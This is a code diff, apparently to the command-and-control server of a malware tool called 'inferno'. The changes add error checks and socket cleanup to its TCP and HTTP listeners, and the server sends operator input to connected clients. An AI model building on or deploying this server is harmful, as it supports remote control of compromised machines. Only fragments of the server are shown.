@@ -4,12 +4,13 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
 #define IP "127.0.0.1"
 #define PORT_TCP 33333
 #define PORT_HTTP 80
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
 
 //handle erros
 void error(char *message) {
@@ -41,6 +42,8 @@ int main() {
     
     //http socket
     int http_listener_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (http_listener_socket == -1)
+        error("HTTP socket creation failed");
 
     //bind tcp
     printf("Binding socket to c2 address...\n");
@@ -114,21 +117,28 @@ int main() {
                 printf("Sending to client: %s\n", response);
                 puts("===========END PAYLOAD===========\n");
             }
-
             //sending to client
             printf("Sending to client: %s\n", input);
             send(inferno_accept, input, sizeof(input), 0);
         }
+
+        // close HTTP accept
+        //close(http_listener_accept);
 
         //close accept
         close(inferno_accept);
 
     }
 
-        //close
-        printf("Closing socket...\n");
-        if (close(inferno_socket) == -1)
-            error("Failed closing socket");
+    //close http socket
+    printf("Closing HTTP socket...\n");
+    if (close(http_listener_socket) == -1)
+        error("Failed closing HTTP socket");
+
+    //close
+    printf("Closing socket...\n");
+    if (close(inferno_socket) == -1)
+        error("Failed closing socket");
 }
 
 int http_listener(int http_listener_socket) {
@@ -147,15 +157,21 @@ int http_listener(int http_listener_socket) {
     //bind http
     printf("Binding http listener...\n");
     int http_listener_bind = bind(http_listener_socket, (struct sockaddr *) &http_listener_address, sizeof(http_listener_address));
+    if (http_listener_bind == -1)
+        error("Binding HTTP failed");
 
     //listen http
     printf("Listening...\n");
     int http_listener_listen = listen(http_listener_socket, 0);
+    if (http_listener_listen == -1)
+        error("Failed listening");
 
     //accept http
     printf("Accepting...\n");
     int http_listener_accept = accept(http_listener_socket, NULL, NULL);
-    
+    if (http_listener_accept == -1)
+        error("Failed accepting");
+
     return http_listener_accept;
 }
 
